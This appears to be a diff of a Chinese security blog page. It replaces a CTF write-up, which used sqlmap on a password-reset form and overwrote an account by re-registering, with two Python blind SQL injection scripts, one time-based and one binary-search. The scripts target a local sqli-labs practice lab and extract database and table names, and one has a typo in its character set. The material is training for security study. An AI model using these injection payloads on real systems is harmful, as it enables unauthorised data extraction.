@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <link rel="icon" href="">
-  <title>攻防世界web进阶区ics-04详解 | wumingzhilian</title>
+  <title>Sql注入脚本 | wumingzhilian</title>
   <meta name="author" content="wuming" />
   <meta http-equiv="Cache-Control" content="no-transform" />
   <meta http-equiv="Cache-Control" content="no-siteapp" />
@@ -15,13 +15,13 @@
     
       <meta name="description" itemprop="description" content="" />
     
-    <meta property="og:title" content="攻防世界web进阶区ics-04详解" />
+    <meta property="og:title" content="Sql注入脚本" />
     
-    <meta property="og:url" content="http://wumingzhilian.github.to/2020/08/07/ics-05/" />
+    <meta property="og:url" content="http://wumingzhilian.github.to/2020/10/18/Sql/" />
     
       <meta name="twitter:card" content="summary" />
       <meta name="twitter:site" content="@wumingzhilian" />
-      <meta name="twitter:title" content="攻防世界web进阶区ics-04详解" />
+      <meta name="twitter:title" content="Sql注入脚本" />
       
         <meta name="twitter:description" content="" />
       
@@ -108,28 +108,25 @@
     <article>
         <div class="kratos-hentry kratos-post-inner clearfix">
             <header class="kratos-entry-header">
-                <h1 class="kratos-entry-title text-center">攻防世界web进阶区ics-04详解</h1>
+                <h1 class="kratos-entry-title text-center">Sql注入脚本</h1>
                 
                 <div class="kratos-post-meta text-center">
                     <span>
-                    <i class="fa fa-calendar"></i> 2020-08-07
-                    <i class="fa fa-folder"></i> 分类于 <a class="label-link" href="/categories/CTF/">CTF</a>
+                    <i class="fa fa-calendar"></i> 2020-10-18
+                    <i class="fa fa-folder"></i> 分类于 <a class="label-link" href="/categories/Sql%E6%B3%A8%E5%85%A5/">Sql注入</a>
                     <i class="fa fa-user"></i> 作者 wuming
                     </span>
                 </div>
             </header>
             <div class="kratos-post-content">
                 
-                    <div class="kratos-post-inner-toc">
-                        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">详解</span></a></li></ol></li></ol>
-                    </div>
-                
                 <hr />
-                <h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://img-blog.csdnimg.cn/2020080700102895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开环境，发现就一个登录和注册功能可以用。还有一个用户找回密码功能。</p>
-<h2 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h2><p><img src="https://img-blog.csdnimg.cn/20200807003522432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们发现有三个入口<br>注册，登录，找回密码<br>我们使用sqlmap扫描，发现只有找回密码可以进行sql注入<br><img src="https://img-blog.csdnimg.cn/20200807003634759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200807003728363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>python2 sqlmap.py -r       -batch --dbs</code><br><img src="https://img-blog.csdnimg.cn/20200807003744543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200807003939249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>cert中只有一个表 user<br>我们看他字段<br><img src="https://img-blog.csdnimg.cn/20200807004012923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200807004650559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20200807004939357.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>登录成功获取flag<br>当然，这是在可以获取到密码的情况</p>
-<p>实际上我们并不能一定可以解决</p>
-<p>那么我们可以进行重复注册<br><img src="https://img-blog.csdnimg.cn/20200807005120292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们尝试去覆盖他的原来的账号密码，发现也是可以登陆的</p>
+                <p>自增脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">import requests</span><br><span class="line">import datetime</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 获取数据库名长度</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def database_len():</span><br><span class="line">    for i in range(1, 10):</span><br><span class="line">        url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;index.php&quot;</span><br><span class="line">        payload &#x3D; &quot; ?id&#x3D;1&#39; and if(length(database())&gt;%s,sleep(1),0) --+&quot; % i</span><br><span class="line">        # print(url+payload+&#39;%23&#39;)</span><br><span class="line">        time1 &#x3D; datetime.datetime.now()</span><br><span class="line">        r &#x3D; requests.get(url + payload)</span><br><span class="line">        time2 &#x3D; datetime.datetime.now()</span><br><span class="line">        sec &#x3D; (time2 - time1).seconds</span><br><span class="line">        if sec &gt;&#x3D; 1:</span><br><span class="line">            print(i)</span><br><span class="line">        else:</span><br><span class="line">            print(i)</span><br><span class="line">            break</span><br><span class="line">    print(&#39;database_len:&#39;, i)</span><br><span class="line"></span><br><span class="line">#获取数据库名</span><br><span class="line">def database_name():</span><br><span class="line">    name &#x3D; &#39;&#39;</span><br><span class="line">    for j in range(1,9):</span><br><span class="line">        for i in &#39;abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.&#39;:</span><br><span class="line">            #0123456789abcdefghijklmnopqrstuvwxyz</span><br><span class="line">            url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;index.php&quot;</span><br><span class="line">            payload &#x3D; &quot;?id&#x3D;1&#39; and if(substr(database(),%d,1)&#x3D;&#39;%s&#39;,sleep(3),0) --+&quot; % (j,i)</span><br><span class="line">            #print(url+payload)</span><br><span class="line">            time1 &#x3D; datetime.datetime.now()</span><br><span class="line">            r &#x3D; requests.get(url + payload)</span><br><span class="line">            time2 &#x3D; datetime.datetime.now()</span><br><span class="line">            sec &#x3D; (time2 - time1).seconds</span><br><span class="line">            if sec &gt;&#x3D;3:</span><br><span class="line">                name +&#x3D; i</span><br><span class="line">                print(name)</span><br><span class="line">                break</span><br><span class="line">    print(&#39;database_name:&#39;, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    database_name()</span><br></pre></td></tr></table></figure>
+<p>二分法脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39;and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),&#123;b&#125;,1))&lt;&#123;a&#125;--+ &quot;</span><br><span class="line"></span><br><span class="line">tablename&#x3D;&#39;&#39;</span><br><span class="line"></span><br><span class="line">for b in range(1,10):</span><br><span class="line">    min&#x3D;0</span><br><span class="line">    max&#x3D;127</span><br><span class="line">    while (max-min)&gt;1:</span><br><span class="line">        mid&#x3D;(min+max)&#x2F;&#x2F;2#（整数除法）</span><br><span class="line">        payload &#x3D; url.format(a&#x3D;mid, b&#x3D;b)</span><br><span class="line">        print (payload)</span><br><span class="line">        r&#x3D;requests.get(payload,timeout&#x3D;10)</span><br><span class="line">        print (r.text)</span><br><span class="line">        if &#39;are&#39; in r.text:</span><br><span class="line">            max&#x3D;mid</span><br><span class="line">        else:</span><br><span class="line">            min&#x3D;mid</span><br><span class="line">    tablename+&#x3D;chr(min)</span><br><span class="line">    print(min)</span><br><span class="line">    print(tablename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print (tablename)</span><br></pre></td></tr></table></figure>
+
+
 
             </div>
             
@@ -185,7 +182,7 @@
     <script type="text/javascript">
         $(()=>{
             new QRCode("wechat-qr", {
-                text: "http://wumingzhilian.github.to/2020/08/07/ics-05/",
+                text: "http://wumingzhilian.github.to/2020/10/18/Sql/",
                 width: 150,
                 height: 150,
                 correctLevel : QRCode.CorrectLevel.H
@@ -197,10 +194,10 @@
             const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
             const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
             const twitterBase   = "https://twitter.com/intent/tweet?";
-            const hostUrl       = "http://wumingzhilian.github.to/2020/08/07/ics-05/";
-            const title         = "「攻防世界web进阶区ics-04详解」";
-            const excerpt       = `题目打开环境，发现就一个登录和注册功能可以用。还有一个用户找回密码功能。
-详解我们发现有三个入口注册，登录，找回密码我们使用sqlmap扫描，发现只有找回密码可以进行sql注入python2 sqlmap.py -r       -b...`;
+            const hostUrl       = "http://wumingzhilian.github.to/2020/10/18/Sql/";
+            const title         = "「Sql注入脚本」";
+            const excerpt       = `自增脚本
+12345678910111213141516171819202122232425262728293031323334353637383940414243444546# coding:utf-8import requests...`;
             let _URL;
             switch (dest) {
                 case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
@@ -219,10 +216,10 @@
                 <div class="footer-tag clearfix">
                     <div class="pull-left">
                     <i class="fa fa-tags"></i>
-                        <a class="tag-none-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-none-link" href="/tags/WEB/" rel="tag">WEB</a>, <a class="tag-none-link" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag">攻防世界</a>
+                        <a class="tag-none-link" href="/tags/Sql%E6%B3%A8%E5%85%A5/" rel="tag">Sql注入</a>, <a class="tag-none-link" href="/tags/%E8%84%9A%E6%9C%AC/" rel="tag">脚本</a>
                     </div>
                     <div class="pull-date">
-                    <span>最后编辑：2020-08-07</span>
+                    <span>最后编辑：2020-10-18</span>
                     </div>
                 </div>
             </footer>
@@ -231,13 +228,9 @@
             <nav class="navigation post-navigation clearfix" role="navigation">
                 
                 <div class="nav-previous clearfix">
-                    <a title=" 攻防世界web进阶区FlatScience详解" href="/2020/08/06/攻防世界web进阶区FlatScience详解/">&lt; 上一篇</a>
+                    <a title=" Sql注入总结学习" href="/2020/10/18/Sql注入总结学习/">&lt; 上一篇</a>
                 </div>
                 
-                
-                <div class="nav-next clearfix">
-                    <a title=" 攻防世界web进阶区Cat详解" href="/2020/08/07/攻防世界web进阶区Cat详解/">下一篇 &gt;</a>
-                </div>
                 
             </nav>
         
@@ -249,8 +242,8 @@
         new DisqusJS({
             shortname: '',
             siteName: '',
-            identifier: '2020/08/07/ics-05/',
-            url: 'http://wumingzhilian.github.to/2020/08/07/ics-05/',
+            identifier: '2020/10/18/Sql/',
+            url: 'http://wumingzhilian.github.to/2020/10/18/Sql/',
             api: '',
             apikey: '',
             admin: '',
@@ -276,7 +269,7 @@
     </div>
     <div class="textwidget">
         
-            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">详解</span></a></li></ol></li></ol>
+            <p class="text-center"></p>
         
     </div>
 </aside>
